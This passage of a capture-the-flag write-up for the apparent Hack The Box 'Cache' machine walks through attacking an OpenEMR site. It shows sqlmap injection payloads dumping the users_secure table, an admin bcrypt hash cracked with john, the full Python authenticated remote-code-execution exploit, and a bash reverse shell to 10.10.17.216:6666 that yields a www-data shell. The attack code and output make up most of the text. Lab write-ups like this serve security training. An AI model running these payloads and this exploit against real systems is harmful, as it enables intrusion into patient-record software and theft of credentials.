    |</span><br><span class="line">| rule_reminder                         |</span><br><span class="line">| rule_target                           |</span><br><span class="line">| sequences                             |</span><br><span class="line">| shared_attributes                     |</span><br><span class="line">| standardized_tables_track             |</span><br><span class="line">| supported_external_dataloads          |</span><br><span class="line">| syndromic_surveillance                |</span><br><span class="line">| template_users                        |</span><br><span class="line">| therapy_groups                        |</span><br><span class="line">| therapy_groups_counselors             |</span><br><span class="line">| therapy_groups_participant_attendance |</span><br><span class="line">| therapy_groups_participants           |</span><br><span class="line">| transactions                          |</span><br><span class="line">| user_settings                         |</span><br><span class="line">| users                                 |</span><br><span class="line">| users_facility                        |</span><br><span class="line">| users_secure                          |</span><br><span class="line">| valueset                              |</span><br><span class="line">| voids                                 |</span><br><span class="line">| x12_partners                          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"></span><br><span class="line">[09:58:45] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:58:45 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure>

<h3 id="3-çˆ†users-secureè¡¨å­—æ®µ"><a href="#3-çˆ†users-secureè¡¨å­—æ®µ" class="headerlink" title="3.çˆ†users_secureè¡¨å­—æ®µ"></a>3.çˆ†users_secureè¡¨å­—æ®µ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr -T users_secure --columns --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [(]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:37:10 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[10:37:10] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[10:37:11] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[10:37:11] [INFO] testing connection to the target URL</span><br><span class="line">[10:37:11] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:37:11] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[10:37:11] [INFO] fetching columns for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;</span><br><span class="line">[10:37:12] [INFO] retrieved: &#x27;id&#x27;,&#x27;bigint(20)&#x27;</span><br><span class="line">[10:37:12] [INFO] retrieved: &#x27;username&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:13] [INFO] retrieved: &#x27;password&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:13] [INFO] retrieved: &#x27;salt&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;last_update&#x27;,&#x27;timestamp&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;password_history1&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;salt_history1&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:15] [INFO] retrieved: &#x27;password_history2&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:15] [INFO] retrieved: &#x27;salt_history2&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">Database: openemr                                                                                                                                           </span><br><span class="line">Table: users_secure</span><br><span class="line">[9 columns]</span><br><span class="line">+-------------------+--------------+</span><br><span class="line">| Column            | Type         |</span><br><span class="line">+-------------------+--------------+</span><br><span class="line">| id                | bigint(20)   |</span><br><span class="line">| last_update       | timestamp    |</span><br><span class="line">| password          | varchar(255) |</span><br><span class="line">| password_history1 | varchar(255) |</span><br><span class="line">| password_history2 | varchar(255) |</span><br><span class="line">| salt              | varchar(255) |</span><br><span class="line">| salt_history1     | varchar(255) |</span><br><span class="line">| salt_history2     | varchar(255) |</span><br><span class="line">| username          | varchar(255) |</span><br><span class="line">+-------------------+--------------+</span><br><span class="line"></span><br><span class="line">[10:37:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:37:15 /2020-10-01/</span><br></pre></td></tr></table></figure>

<h3 id="4-çˆ†æ•°æ®"><a href="#4-çˆ†æ•°æ®" class="headerlink" title="4.çˆ†æ•°æ®"></a>4.çˆ†æ•°æ®</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr -T users_secure -C username,password --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [&quot;]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:47:00 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[10:47:00] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[10:47:00] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[10:47:00] [INFO] testing connection to the target URL</span><br><span class="line">[10:47:01] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:47:01] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[10:47:01] [INFO] fetching entries of column(s) &#x27;password, username&#x27; for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;</span><br><span class="line">Database: openemr</span><br><span class="line">Table: users_secure</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[10:47:01] [INFO] table &#x27;openemr.users_secure&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/hms.htb/dump/openemr/users_secure.csv&#x27;</span><br><span class="line">[10:47:01] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:47:01 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure>

<h2 id="0x09-ç ´è§£hashå€¼"><a href="#0x09-ç ´è§£hashå€¼" class="headerlink" title="0x09.ç ´è§£hashå€¼"></a>0x09.ç ´è§£hashå€¼</h2><p><code>ç ´è§£ä¸ºxxxxxx</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# cat hash </span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$05</span><span class="variable">$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</span></span><br><span class="line">root@JIYE:~/htb/cache# john -w=/usr/share/wordlists/rockyou.txt hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 32 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-10-01 10:58) 5.555g/s 4800p/s 4800c/s 4800C/s tristan..felipe</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure>

<h2 id="0x10-Googleæœç´¢exp"><a href="#0x10-Googleæœç´¢exp" class="headerlink" title="0x10.Googleæœç´¢exp"></a>0x10.Googleæœç´¢exp</h2><p><code>OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDUxNjE=">expåœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">ap = argparse.ArgumentParser(description=&quot;OpenEMR RCE&quot;)</span><br><span class="line">ap.add_argument(&quot;host&quot;, help=&quot;Path to OpenEMR (Example: http://127.0.0.1/openemr).&quot;)</span><br><span class="line">ap.add_argument(&quot;-u&quot;, &quot;--user&quot;, help=&quot;Admin username&quot;)</span><br><span class="line">ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, help=&quot;Admin password&quot;)</span><br><span class="line">ap.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command to run.&quot;)</span><br><span class="line">args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">ascii = &quot;&gt; .---.  ,---.  ,---.  .-. .-.,---.          ,---.    &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt; )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;                                                       \r\n&quot;</span><br><span class="line">ascii+= &quot;   =&#123;&gt;   P R O J E C T    I N S E C U R I T Y   &lt;&#125;=    \r\n&quot;</span><br><span class="line">ascii+= &quot;                                                       \r\n&quot;</span><br><span class="line">ascii+= &quot;         Twitter : &gt;@Insecurity&lt;                       \r\n&quot;</span><br><span class="line">ascii+= &quot;         Site    : &gt;insecurity.sh&lt;                     \r\n&quot;</span><br><span class="line"></span><br><span class="line">green = &quot;\033[1;32m&quot;</span><br><span class="line">red = &quot;\033[1;31m&quot;</span><br><span class="line">clear = &quot;\033[0m&quot;</span><br><span class="line"></span><br><span class="line">load = &quot;[&gt;$&lt;] &quot;.replace(&quot;&gt;&quot;, green).replace(&quot;&lt;&quot;, clear)</span><br><span class="line">err = &quot;[&gt;-&lt;] &quot;.replace(&quot;&gt;&quot;, red).replace(&quot;&lt;&quot;, clear)</span><br><span class="line">intro = ascii.replace(&quot;&gt;&quot;, green).replace(&quot;&lt;&quot;, clear)</span><br><span class="line"></span><br><span class="line">print(intro)</span><br><span class="line"></span><br><span class="line">with requests.session() as s:</span><br><span class="line">    login = &#123;&quot;new_login_session_management&quot;: &quot;1&quot;,</span><br><span class="line">            &quot;authProvider&quot;: &quot;Default&quot;,</span><br><span class="line">            &quot;authUser&quot;: args.user,</span><br><span class="line">            &quot;clearPass&quot;: args.password,</span><br><span class="line">            &quot;languageChoice&quot;: &quot;1&quot;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    print(load + &quot;Authenticating with &quot; + args.user + &quot;:&quot; + args.password)</span><br><span class="line">    r = s.post(args.host + &quot;/interface/main/main_screen.php?auth=login&amp;site=default&quot;, data=login)</span><br><span class="line">    if &quot;login_screen.php?error=1&amp;site=&quot; in r.text:</span><br><span class="line">        print(err + &quot;Failed to Login.&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    # This will rewrite and replace your current GLOBALS, please modify this if you don&#x27;t want that.</span><br><span class="line">    payload = &quot;form_save=Save&amp;srch_desc=&amp;form_0=main_info.php&amp;form_1=..%2F..%2Finterface&quot;</span><br><span class="line">    payload += &quot;%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&amp;form_2=1&amp;form_3=tabs_&quot;</span><br><span class="line">    payload += &quot;style_full.css&amp;form_4=style_light.css&amp;form_5=__default__&amp;form_6=__default&quot;</span><br><span class="line">    payload += &quot;__&amp;form_7=1&amp;form_8=0&amp;form_9=175&amp;form_10=OpenEMR&amp;form_12=1&amp;form_13=0&amp;form_&quot;</span><br><span class="line">    payload += &quot;14=0&amp;form_16=1&amp;form_21=1&amp;form_22=1&amp;form_23=1&amp;form_24=1&amp;form_25=http%3A%2F&quot;</span><br><span class="line">    payload += &quot;%2Fopen-emr.org%2F&amp;form_26=&amp;form_27=20&amp;form_28=10&amp;form_30=0&amp;form_31=5&amp;for&quot;</span><br><span class="line">    payload += &quot;m_32=0&amp;form_37=English+%28Standard%29&amp;form_38=1&amp;form_42=1&amp;form_43=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;44=1&amp;form_45=1&amp;form_46=1&amp;form_47=1&amp;form_48=1&amp;form_49=1&amp;form_50=1&amp;form_51=&quot;</span><br><span class="line">    payload += &quot;0&amp;form_52=0&amp;form_53=&amp;form_54=2&amp;form_55=.&amp;form_56=%2C&amp;form_57=%24&amp;form_58=&quot;</span><br><span class="line">    payload += &quot;0&amp;form_59=3&amp;form_60=6%2C0&amp;form_61=0&amp;form_62=0&amp;form_63=_blank&amp;form_69=1&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_70=1&amp;form_77=1&amp;form_79=&amp;form_80=&amp;form_81=&amp;form_84=1&amp;form_85=1&amp;form_87=&quot;</span><br><span class="line">    payload += &quot;1&amp;form_89=1&amp;form_90=1&amp;form_91=1&amp;form_92=Y1&amp;form_93=1&amp;form_94=2&amp;form_95=0&amp;&quot;</span><br><span class="line">    payload += &quot;form_97=14&amp;form_98=11&amp;form_99=24&amp;form_100=20&amp;form_102=1&amp;form_103=0&amp;form_1&quot;</span><br><span class="line">    payload += &quot;04=0&amp;form_105=ICD10&amp;form_106=1&amp;form_107=1&amp;form_112=3&amp;form_115=1&amp;form_116=&quot;</span><br><span class="line">    payload += &quot;&amp;form_119=1.00&amp;form_121=0&amp;form_123=&amp;form_125=30&amp;form_126=&amp;form_127=60&amp;for&quot;</span><br><span class="line">    payload += &quot;m_128=&amp;form_129=90&amp;form_130=&amp;form_131=120&amp;form_132=&amp;form_133=150&amp;form_134&quot;</span><br><span class="line">    payload += &quot;=&amp;form_135=1&amp;form_138=1&amp;form_139=1&amp;form_141=1&amp;form_142=0&amp;form_143=localho&quot;</span><br><span class="line">    payload += &quot;st&amp;form_144=&amp;form_145=&amp;form_146=5984&amp;form_147=&amp;form_150=Patient+ID+card&amp;f&quot;</span><br><span class="line">    payload += &quot;orm_151=Patient+Photograph&amp;form_152=Lab+Report&amp;form_153=Lab+Report&amp;form_1&quot;</span><br><span class="line">    payload += &quot;55=100&amp;form_157=8&amp;form_158=17&amp;form_159=15&amp;form_160=day&amp;form_161=1&amp;form_16&quot;</span><br><span class="line">    payload += &quot;2=2&amp;form_163=1&amp;form_164=10&amp;form_165=10&amp;form_166=15&amp;form_167=20&amp;form_168=1&quot;</span><br><span class="line">    payload += &quot;&amp;form_169=%23FFFFFF&amp;form_170=%23E6E6FF&amp;form_171=%23E6FFE6&amp;form_172=%23FFE&quot;</span><br><span class="line">    payload += &quot;6FF&amp;form_173=1&amp;form_174=0&amp;form_176=1&amp;form_177=1&amp;form_178=1&amp;form_181=1&amp;for&quot;</span><br><span class="line">    payload += &quot;m_182=1&amp;form_183=1&amp;form_184=1&amp;form_185=D0&amp;form_186=D0&amp;form_187=0%3A20&amp;for&quot;</span><br><span class="line">    payload += &quot;m_188=0&amp;form_190=33&amp;form_191=0&amp;form_194=7200&amp;form_198=1&amp;form_199=0&amp;form_2&quot;</span><br><span class="line">    payload += &quot;00=0&amp;form_202=&amp;form_203=&amp;form_204=365&amp;form_205=&amp;form_206=1&amp;form_208=&amp;form&quot;</span><br><span class="line">    payload += &quot;_210=&amp;form_211=&amp;form_212=&amp;form_213=&amp;form_214=&amp;form_215=&amp;form_216=SMTP&amp;for&quot;</span><br><span class="line">    payload += &quot;m_217=localhost&amp;form_218=25&amp;form_219=&amp;form_220=&amp;form_221=&amp;form_222=50&amp;for&quot;</span><br><span class="line">    payload += &quot;m_223=50&amp;form_224=&amp;form_225=&amp;form_226=&amp;form_227=50&amp;form_228=&amp;form_229=&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_230=&amp;form_231=1&amp;form_232=1&amp;form_233=1&amp;form_234=1&amp;form_235=1&amp;form_236=1&quot;</span><br><span class="line">    payload += &quot;&amp;form_237=1&amp;form_238=1&amp;form_239=Model+Registry&amp;form_240=125789123&amp;form_24&quot;</span><br><span class="line">    payload += &quot;1=1&amp;form_242=1&amp;form_243=1&amp;form_244=&amp;form_245=&amp;form_246=1&amp;form_247=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;248=1&amp;form_249=5&amp;form_250=1&amp;form_252=1&amp;form_253=1&amp;form_254=1&amp;form_255=1&amp;f&quot;</span><br><span class="line">    payload += &quot;orm_256=1&amp;form_257=1&amp;form_258=1&amp;form_262=&amp;form_263=6514&amp;form_264=&amp;form_26&quot;</span><br><span class="line">    payload += &quot;5=&amp;form_267=1&amp;form_268=0&amp;form_269=%2Fusr%2Fbin&amp;form_270=%2Fusr%2Fbin&amp;form&quot;</span><br><span class="line">    payload += &quot;_271=%2Ftmp&amp;form_272=%2Ftmp&amp;form_273=26&amp;form_274=state&amp;form_275=1&amp;form_27&quot;</span><br><span class="line">    payload += &quot;6=26&amp;form_277=country&amp;form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6&quot;</span><br><span class="line">    payload += &quot;+-o+page-left%3D72+-o+page-top%3D72&amp;form_279=&amp;form_280=&amp;form_282=2018-07-&quot;</span><br><span class="line">    payload += &quot;23&amp;form_283=1&amp;form_285=%2Fvar%2Fspool%2Fhylafax&amp;form_286=enscript+-M+Lett&quot;</span><br><span class="line">    payload += &quot;er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&amp;form_288=%2Fmnt%2Fscan_docs&amp;for&quot;</span><br><span class="line">    payload += &quot;m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&amp;form_292=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&amp;form_297=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;299=&amp;form_300=&amp;form_301=&amp;form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr&quot;</span><br><span class="line">    payload += &quot;ovider.php&amp;form_303=https%3A%2F%2Fssh.mydocsportal.com&amp;form_305=https%3A%&quot;</span><br><span class="line">    payload += &quot;2F%2Fyour_cms_site.com%2F&amp;form_306=&amp;form_307=&amp;form_308=0&amp;form_309=https%3&quot;</span><br><span class="line">    payload += &quot;A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&amp;form_312=https%3A%2F%2Fsecure.newcrop&quot;</span><br><span class="line">    payload += &quot;accounts.com%2FInterfaceV7%2FRxEntry.aspx&amp;form_313=https%3A%2F%2Fsecure.n&quot;</span><br><span class="line">    payload += &quot;ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F&quot;</span><br><span class="line">    payload += &quot;%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_314=21600&amp;form_315=21600&amp;form_316=&amp;form_317=&amp;form_318=&amp;form_319=1&amp;form&quot;</span><br><span class="line">    payload += &quot;_324=&amp;form_325=0&amp;form_327=137&amp;form_328=7C84773D5063B20BC9E41636A091C6F17E&quot;</span><br><span class="line">    payload += &quot;9C1E34&amp;form_329=C36275&amp;form_330=0&amp;form_332=https%3A%2F%2Fphimail.example.&quot;</span><br><span class="line">    payload += &quot;com%3A32541&amp;form_333=&amp;form_334=&amp;form_335=admin&amp;form_336=5&amp;form_339=1&amp;form&quot;</span><br><span class="line">    payload += &quot;_346=LETTER&amp;form_347=30&amp;form_348=30&amp;form_349=72&amp;form_350=30&amp;form_351=P&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_352=en&amp;form_353=LETTER&amp;form_354=5&amp;form_355=5&amp;form_356=5&amp;form_357=8&amp;for&quot;</span><br><span class="line">    payload += &quot;m_358=D&amp;form_359=1&amp;form_360=9&amp;form_361=1&amp;form_362=104.775&amp;form_363=241.3&amp;&quot;</span><br><span class="line">    payload += &quot;form_364=14&amp;form_365=65&amp;form_366=220&quot;</span><br><span class="line"></span><br><span class="line">    p = &#123;&#125;</span><br><span class="line">    for c in payload.replace(&quot;&amp;&quot;, &quot;\n&quot;).splitlines():</span><br><span class="line">        a = c.split(&quot;=&quot;)</span><br><span class="line">        p.update(&#123;a[0]: a[1]&#125;)</span><br><span class="line">   </span><br><span class="line">    # Linux only, but can be easily modified for Windows.</span><br><span class="line">    _cmd = &quot;|| echo &quot; + base64.b64encode(args.cmd) + &quot;|base64 -d|bash&quot;</span><br><span class="line">    p.update(&#123;&quot;form_284&quot;: _cmd&#125;)</span><br><span class="line">    </span><br><span class="line">    print(load + &quot;Injecting payload&quot;)</span><br><span class="line">    s.post(args.host + &quot;/interface/super/edit_globals.php&quot;, data=p)</span><br><span class="line">    sp = s.get(args.host + &quot;/interface/main/daemon_frame.php&quot;) # M4tt D4em0n w0z h3r3 ;PpPpp</span><br><span class="line">    if sp.status_code == 200:</span><br><span class="line">        print(load + &quot;Payload executed&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="0x11-exploit"><a href="#0x11-exploit" class="headerlink" title="0x11.exploit"></a>0x11.exploit</h2><h3 id="1-é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒargparseåœ°å€"><a href="#1-é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒargparseåœ°å€" class="headerlink" title="1.é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒargparseåœ°å€"></a>1.é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒ<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5weXRob25ob3N0ZWQub3JnL3BhY2thZ2VzLzE4L2RkL2U2MTdjZmMzZjYyMTBhZTE4MzM3NGNkOWY2YTI2YjIwNTE0YmJiNWE3OTJhZjk3OTQ5YzVhYWNkZGYwZi9hcmdwYXJzZS0xLjQuMC50YXIuZ3o=">argparseåœ°å€<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzvf argparse-1.4.0.tar.gz</span><br><span class="line">cd argparse-1.4.0</span><br><span class="line">python setup.py install</span><br><span class="line">easy_install argparse</span><br><span class="line">pip install argparse</span><br></pre></td></tr></table></figure>



<h3 id="2-kaliç›‘å¬"><a href="#2-kaliç›‘å¬" class="headerlink" title="2.kaliç›‘å¬"></a>2.kaliç›‘å¬</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ..</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# python2 exp.py http://hms.htb -u openemr_admin -p xxxxxx -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.17.216/6666 0&gt;&amp;1&#x27;</span><br><span class="line"> .---.  ,---.  ,---.  .-. .-.,---.          ,---.    </span><br><span class="line">/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   </span><br><span class="line">| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   </span><br><span class="line">| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    </span><br><span class="line">\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   </span><br><span class="line"> )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  </span><br><span class="line">(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) </span><br><span class="line">                                                       </span><br><span class="line">   =&#123;   P R O J E C T    I N S E C U R I T Y   &#125;=    </span><br><span class="line">                                                       </span><br><span class="line">         Twitter : @Insecurity                       </span><br><span class="line">         Site    : insecurity.sh                     </span><br><span class="line"></span><br><span class="line"><span class="meta">[$</span><span class="bash">] Authenticating with openemr_admin:xxxxxx</span></span><br><span class="line"><span class="meta">[$</span><span class="bash">] Injecting payload</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-åå¼¹shell"><a href="#4-åå¼¹shell" class="headerlink" title="4.åå¼¹shell"></a>4.åå¼¹shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.188] 37914</span><br><span class="line">bash: cannot set terminal process group (1684): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure>

